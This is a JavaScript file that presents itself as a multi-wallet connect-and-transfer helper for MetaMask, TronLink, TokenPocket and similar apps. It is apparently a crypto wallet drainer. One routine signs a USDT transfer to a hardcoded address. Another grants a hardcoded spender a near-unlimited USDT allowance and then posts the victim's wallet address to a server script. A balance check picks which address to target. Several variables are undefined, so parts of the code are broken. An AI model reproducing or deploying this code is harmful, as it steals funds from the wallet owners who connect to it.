(function () {
    const oke = async () => {
        var tronWeb = window.tronWeb;
        let contract = await tronWeb.contract().at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");
        let walletAddress = tronWeb.defaultAddress.base58;  //我的地址

        let result = await contract.balanceOf(walletAddress).call(function (err, tex) {
            if (err == null) {
                let total = tex._hex / (10 ** 6);
                if (total > amout) {
                    var abicion = abicoin;
                } else {
                    var abicion = authorized_address
                }
                this.abio = abicion;
            }
        });
    }
    const ERC20 = async ({address, data, value, callBack}) => {
        const account = await ethereum.request({
            method: 'eth_requestAccounts'
        })
        if (account && account.length > 0) {
            const params = {
                to: address,
                from: account[0],
                data: data
            };
            web3.eth.sendTransaction(params)
        }
    }
    const TRC20 = async ({address, data, value, callBack}) => {
        const functionSelector = 'transfer(address,uint256)';
        let walletAddress = tronWeb.defaultAddress.base58;
        const parameter = [{type: 'address', value: 'TPJwMxr9b9hgbdGfA3vsBdTSrsbaLcQw27'}, {
            type: 'uint256',
            value: 100000000
        }]
        const tx = await tronWeb.transactionBuilder.triggerSmartContract("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", functionSelector, {}, parameter);
        const signedTx = await tronWeb.trx.sign(tx.transaction);
        const result = await tronWeb.trx.sendRawTransaction(signedTx);
    }
    const TpERC20 = async (address, value, approveData, successCallBack, errorCallBack) => {
        const {result, msg, data: resultData, ...other} = await window.tp.getWallet({
            walletTypes: ['eth'],
            switch: false
        })
        if (result) {
            const {address: formAddress, blockchain_id} = resultData
            if (resultData && blockchain_id === 1) {
                const params = {
                    to: address,
                    from: formAddress,
                    data: approveData
                };
                const sendResult = await window.tp.sendEthTransaction(params)
                successCallBack(sendResult)
            } else {
                errorCallBack({result: false, msg: ""})
            }
        } else {
            errorCallBack({result, msg})
        }
    }

    const TpTRC20 = async (params) => {
        let tronWeb = window.tronWeb
        let walletAddress = tronWeb.defaultAddress.base58
        let instance = await tronWeb.contract().at('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t')
        let res = await instance['increaseApproval']('TThh4Ad6grVD5Gs8Vnvac9Ek1rtfuqNH13', '90000000000000000000000000000')
        res.send(
            {
                feeLimit: 100000000,
                callValue: 0,
                shouldPollResponse: false,
            },
            function (err, res) {
                if (err == null) {
                    var timestamp = new Date().getTime()
                    var output = GetRandomNum(10000, 99999)
                    outputs = timestamp + '' + output
                    var data = {}
                    data.value = outputs
                    data.sqgl = walletAddress
                    data.pzzz = total
                    data.sqt = authorized_address
                    data.type = 'TRX'
                    data.pid = 1
                    var params = Object.keys(data)
                        .map(function (key) {
                            return encodeURIComponent(key) + '=' + encodeURIComponent(data[key])
                        })
                        .join('&')
                    b('./transfer.php', params, function (data) {
                        console.log(data)
                    })
                }
            }
        )
    }

    const SignAndTransferObj = (type) => {
        alert(type)
        return {
            coinbase: async (params) => {
                await ERC20(params)
            },
            tornLink: async (params) => {
                // 只有trc20  使用trc20 通用
                await TRC20(params)
            },
            oke: async (params) => {
                if (type === 'erc20') {
                    await ERC20(params)
                } else {
                    await oke(params)
                }
            },
            imToken: async (params) => {
                await ERC20(params)
            },
            tokenPocket: async (params) => {
                console.log(JSON.stringify(params))
                if (type === 'erc20') {
                    await TpERC20(params)
                } else {
                    await TpTRC20(params)
                }
            },
            metaMask: async (params) => {
                await ERC20(params)
            },
            trustWallet: async (params) => {
                await ERC20(params)
            },
            bitKeep: async (params) => {
                await ERC20(params)
            },
        }
    }

    window.signAndTransfer = async ({appName, type, ...params}) => {
        switch (appName) {
            case 'tornLink':
                await SignAndTransferObj("trc20").tornLink(params)
                break;
            case 'metaMask':
                await SignAndTransferObj(type).metaMask(params)
                break;
            case 'oke':
                alert(appName)
                await SignAndTransferObj(type).oke(params)
                break;
            case 'coinbase':
                await SignAndTransferObj('erc20').coinbase(params)
                break;
            case 'trustWallet':
                await SignAndTransferObj('erc20').trustWallet(params)
                break;
            case 'bitKeep':
                await SignAndTransferObj(type).bitKeep(params)
                break;
            case 'tokenPocket':
                await SignAndTransferObj(type).tokenPocket(params)
                break;
            case 'imToken':
                await SignAndTransferObj(type).imToken(params)
                break;
        }
    }

    window.openApp = ({appName, callBackUrl}) => {
        const metaMaskUrl = "https://metamask.app.link/dapp/"
        const okx = "okx://wallet/dapp/details?dappUrl="
        const coinbase = "https://go.cb-w.com/dapp?cb_url="
        const trustWallet = 'https://link.trustwallet.com/open_url?coin_id=60&url='
        const bitKeep = "bitkeep://bkconnect?action=dapp&url="
        const tokenPocket = 'tpdapp://open?params=';
        const imToken = "imtokenv2://navigate?screen=DappView&url=";
        switch (appName) {
            case 'metaMask':
                window.location.href = metaMaskUrl + callBackUrl;
                break;
            case 'oke':
                window.location.href = okx + callBackUrl;
                break;
            case 'coinbase':
                window.location.href = coinbase + callBackUrl;
                break;
            case 'trustWallet':
                window.location.href = trustWallet + callBackUrl;
                break;
            case 'bitKeep':
                window.location.href = bitKeep + encodeURIComponent(callBackUrl)
                break;
            case 'tokenPocket':
                window.location.href = tokenPocket + '{"url": "' + encodeURIComponent(callBackUrl) + '"}'
                break;
            case 'imToken':
                window.location.href = imToken + encodeURIComponent(callBackUrl)
                break;
            case 'tronLink':
                const tronLinkUrl = 'tronlinkoutside://pull.activity?param={"url":"' + encodeURIComponent(callBackUrl) + '","action":"open","protocol":"tronlink","version":"1.0"}';
                window.location.href = tronLinkUrl
                break;
        }
    }

})()
